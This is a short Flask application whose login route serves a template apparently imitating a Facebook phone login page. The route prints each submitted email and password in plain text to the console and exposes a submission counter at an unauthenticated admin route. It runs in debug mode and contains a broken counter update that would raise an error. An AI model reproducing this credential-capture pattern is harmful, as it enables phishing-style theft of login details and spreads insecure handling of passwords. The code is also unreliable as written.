from flask import Flask, request, render_template
from services import checkUsernameAndPassword

app = Flask(__name__)

@app.route('/')  
def index():
    error = False
    return render_template("siteFacebookPHoneDesigne.html",error = error )

#Variable d'application globale (serveur)
uses =0 

@app.route('/',  methods=['POST'])
def login():
    error = True
    email = request.form.get('email')
    password = request.form.get('password')
    uses =uses + 1 
    print(email)
    print(password)
    return render_template("gold-site.html")  if checkUsernameAndPassword(email, password) else render_template("siteFacebookPHoneDesigne.html" , error = error )


@app.route('/admin/count')
def count():    
    return render_template("admin-site.html",  uses = uses)


if __name__ == "__main__":
    app.static_folder = 'static'
    app.run(debug=True)
